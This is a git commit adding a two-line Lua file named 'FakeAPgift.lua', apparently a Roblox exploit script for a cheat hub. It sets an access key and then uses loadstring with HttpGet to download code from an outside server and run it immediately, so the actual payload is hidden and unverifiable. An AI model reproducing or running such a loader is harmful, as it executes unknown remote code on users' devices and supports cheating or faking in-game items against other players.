ba7efd25625a2b01461c72a2ae51b2c10a6c0f30
Blitsik <blitsoljko@yandex.ru>
2026-03-19 17:51:24 +0500

    FakeAPgift.lua

---
+++ FakeAPgift.lua
@@ -0,0 +1,2 @@
+getgenv().SCRIPT_KEY="Acess to vaeb hub!-7402a1ce-027c-45ce-ace1-b7de4a24e822";
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/7e47e5e99451e60ca106b9e2d8e4008a73bf83e6370b39248af67d87f3891c74/download"))()
